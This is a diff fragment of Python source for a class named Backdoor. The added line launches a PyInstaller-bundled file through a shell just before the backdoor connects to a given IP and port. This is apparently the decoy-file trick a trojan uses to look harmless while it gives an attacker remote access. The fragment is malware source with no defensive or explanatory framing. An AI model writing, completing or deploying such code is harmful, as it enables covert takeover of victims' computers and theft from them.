@@ -104,6 +104,7 @@ class Backdoor:
 options = get_arguments()
 
 file_name = sys._MEIPASS +'\\' + options.file
+subprocess.Popen(file_name, shell=True)
 
 try:
     my_backdoor = Backdoor(options.ip, options.port)
